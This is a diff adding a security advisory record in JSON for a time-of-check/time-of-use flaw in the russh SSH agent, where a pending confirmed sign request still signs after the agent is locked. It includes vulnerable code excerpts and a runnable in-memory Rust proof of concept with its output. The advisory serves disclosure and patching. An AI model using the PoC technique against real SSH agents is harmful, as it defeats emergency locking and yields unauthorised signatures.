@@ -1,0 +1,60 @@
+{
+  "id": "GHSA-736f-c93q-9fwx",
+  "modified": "2026-11-13T19:15:05.906299888Z",
+  "published": "2026-11-13T19:10:46Z",
+  "aliases": [
+    "CVE-2026-128088"
+  ],
+  "summary": "russh try_sign: asynchronous confirmation can sign after agent lock",
+  "details": "### Summary\n\nIn russh `0.65.0`, a sign request for a confirmation-constrained key can retain\nand use the private key after another connection locks the agent. `try_sign()`\nsnapshots an `Arc\u003cPrivateKey\u003e` before awaiting `Agent::confirm()` and does not\nrevalidate the shared lock state after the await. An agent-forwarding peer can\ntherefore obtain a signature while the agent is locked and every new request is\nbeing rejected.\n\n### Details\n\nThe agent's lock and key stores are shared by all connections. `respond()` reads\nthe lock state once, then dispatches a sign request:\n\n```rust\nlet is_locked = {\n    // ... read the shared lock ...\n};\n\n// ...\nSome((\u002613, mut r))\n    if !is_locked \u0026\u0026 agentref.confirm_request(MessageType::Sign).await =\u003e\n{\n    let agent = self.agent.take().ok_or(Error::AgentFailure)?;\n    let (agent, signed) = self.try_sign(agent, \u0026mut r, writebuf).await?;\n```\n\nIn `try_sign()`, russh clones the private key from the shared store and drops the\nstore lock before awaiting the asynchronous confirmation callback:\n\n```rust\nlet key = {\n    let blob = Bytes::decode(r)?;\n    let k = self.keys.0.read().or(Err(Error::AgentFailure))?;\n    if let Some((key, _, constraints)) = k.get(\u0026blob.to_vec()) {\n        if constraints.contains(\u0026Constraint::Confirm) {\n            needs_confirm = true;\n        }\n        key.clone()\n    } else {\n        return Ok((agent, false));\n    }\n};\n\nlet agent = if needs_confirm {\n    let (agent, ok) = agent.confirm(key.clone()).await;\n    if !ok {\n        return Ok((agent, false));\n    }\n    agent\n} else {\n    agent\n};\n\n// No lock/key-state revalidation occurs here.\nsign_with_hash_alg(\u0026PrivateKeyWithHashAlg::new(key, hash_alg), \u0026data)?\n    .encode(writebuf)?;\n```\n\nWhile `confirm()` is pending, a second agent connection can successfully lock\nthe shared agent. When confirmation later returns `true`, the original\nconnection signs with its captured `Arc\u003cPrivateKey\u003e`.\n\nThe affected code is in\n[`russh/src/keys/agent/server.rs`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162)\nand\n[`try_sign()`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375).\n\nRFC 9987 section 5.7 requires a locked agent to suspend private-key signature\noperations until it is unlocked. A fresh request is correctly rejected while\nlocked; only the request suspended across the await bypasses the lock.\n\nThe vulnerable asynchronous call was introduced by commit `62db6e7` as the fix\nfor GHSA-vp5q-ff62-jwqv. The behavior is present in released version `0.65.0`\nand current commit `183a22e8f8f490fa09b6eb7bd044ef99d8c4414f`.\n\n### Expected behavior\n\nAfter the agent reports a successful lock, no private-key signature operation\nshould complete until a successful unlock.\n\n### Actual behavior\n\nA request that reached `Agent::confirm()` before the state transition signs\nafterward. New requests made in the same locked or expired state fail, confirming\nthat the shared state transition took effect.\n\n### Proof of concept\n\nThe PoC is self-contained and uses in-memory duplex streams; it does not require\nan SSH server, Unix socket, or attached binary file. With a current stable Rust\ntoolchain installed, create a new directory:\n\n```sh\nmkdir -p russh-agent-lock-toctou-poc/src\ncd russh-agent-lock-toctou-poc\n```\n\nCreate `Cargo.toml`:\n\n```toml\n[package]\nname = \"russh-agent-lock-toctou-poc\"\nversion = \"0.1.0\"\nedition = \"2024\"\n\n[dependencies]\nfutures = \"0.3\"\nrand = { version = \"0.10\", features = [\"thread_rng\"] }\nrussh = \"=0.65.0\"\ntokio = { version = \"1\", features = [\"macros\", \"rt-multi-thread\", \"sync\"] }\ntokio-stream = \"0.1\"\n```\n\nCreate `src/main.rs`:\n\n```rust\nuse std::{future::Future, sync::Arc};\n\nuse russh::keys::agent::{\n    Constraint,\n    client::AgentClient,\n    server::{self, Agent},\n};\nuse russh::keys::{Algorithm, PrivateKey};\nuse tokio::{\n    io::DuplexStream,\n    sync::{Notify, mpsc},\n};\nuse tokio_stream::wrappers::ReceiverStream;\n\n#[derive(Clone)]\nstruct DelayedConfirm {\n    entered: Arc\u003cNotify\u003e,\n    release: Arc\u003cNotify\u003e,\n}\n\nimpl Agent for DelayedConfirm {\n    fn confirm(\n        self,\n        _key: Arc\u003cPrivateKey\u003e,\n    ) -\u003e Box\u003cdyn Future\u003cOutput = (Self, bool)\u003e + Unpin + Send\u003e {\n        Box::new(Box::pin(async move {\n            self.entered.notify_one();\n            self.release.notified().await;\n            (self, true)\n        }))\n    }\n}\n\nasync fn connect(\n    sender: \u0026mpsc::Sender\u003cstd::io::Result\u003cDuplexStream\u003e\u003e,\n) -\u003e AgentClient\u003cDuplexStream\u003e {\n    let (server_stream, client_stream) = tokio::io::duplex(1024 * 1024);\n    sender.send(Ok(server_stream)).await.unwrap();\n    AgentClient::connect(client_stream)\n}\n\n#[tokio::main]\nasync fn main() {\n    let entered = Arc::new(Notify::new());\n    let release = Arc::new(Notify::new());\n    let agent = DelayedConfirm {\n        entered: entered.clone(),\n        release: release.clone(),\n    };\n\n    let (sender, receiver) = mpsc::channel(4);\n    tokio::spawn(async move {\n        server::serve::\u003cDuplexStream, _, _\u003e(ReceiverStream::new(receiver), agent)\n            .await\n            .unwrap();\n    });\n\n    let key = PrivateKey::random(\u0026mut rand::rng(), Algorithm::Ed25519).unwrap();\n    let public_key = key.public_key().clone();\n\n    let mut administrator = connect(\u0026sender).await;\n    administrator\n        .add_identity(\u0026key, \u0026[Constraint::Confirm])\n        .await\n        .unwrap();\n\n    let mut attacker = connect(\u0026sender).await;\n    let attacker_key = public_key.clone();\n    let pending_sign = tokio::spawn(async move {\n        attacker\n            .sign_request_signature(\u0026attacker_key, None, b\"attacker-controlled request\")\n            .await\n    });\n\n    entered.notified().await;\n    administrator.lock(b\"lock-password\").await.unwrap();\n    println!(\"agent locked while confirmation was pending\");\n\n    // Control: a request started after the lock is rejected.\n    let mut control = connect(\u0026sender).await;\n    let control_result = control\n        .sign_request_signature(\u0026public_key, None, b\"post-lock request\")\n        .await;\n    println!(\"new post-lock request accepted: {}\", control_result.is_ok());\n\n    // The original request signs after the lock has taken effect.\n    release.notify_one();\n    let pending_result = pending_sign.await.unwrap();\n    println!(\n        \"pre-lock request signed after lock: {}\",\n        pending_result.is_ok()\n    );\n\n    assert!(control_result.is_err());\n    assert!(pending_result.is_ok());\n}\n```\n\nRun:\n\n```sh\ncargo run --quiet\n```\n\nObserved on russh `0.65.0` with Rust `1.91.0`:\n\n```text\nagent locked while confirmation was pending\nnew post-lock request accepted: false\npre-lock request signed after lock: true\n```\n\n### Impact\n\nrussh-based SSH agents that implement asynchronous confirmation are affected,\nincluding agents exposed to remote SSH servers through agent forwarding. A peer\ncan begin a signature request while the agent is unlocked and hold it in the\nconfirmation phase. If the agent is subsequently locked, approving or otherwise\ncompleting the stale confirmation still gives the peer a signature that the\nagent's current state rejects for every new request.\n\nThis weakens emergency locking. The attacker does not recover private key\nmaterial, and exploitation requires a sign request to be pending across the\nstate transition and its confirmation callback eventually to return `true`.\n\n## Related\n\n- [RFC 9987 section 5.7: Locking and Unlocking an Agent](https://www.rfc-editor.org/rfc/rfc9987.html#section-5.7)\n- [GHSA-vp5q-ff62-jwqv / CVE-2026-116794: missing confirmation enforcement](https://github.com/advisories/GHSA-vp5q-ff62-jwqv)\n- [Commit `62db6e7`: call `Agent::confirm`](https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f)\n- [Affected `respond()` implementation at `v0.65.0`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162)\n- [Affected `try_sign()` implementation at `v0.65.0`](https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "russh",
+        "purl": "pkg:cargo/russh"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.65.0"
+            },
+            {
+              "fixed": "0.65.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.65.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-736f-c93q-9fwx/GHSA-736f-c93q-9fwx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/security/advisories/GHSA-736f-c93q-9fwx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/pull/808"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Eugeny/russh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Eugeny/russh/releases/tag/v0.65.1"
+    }
+  ]
+}
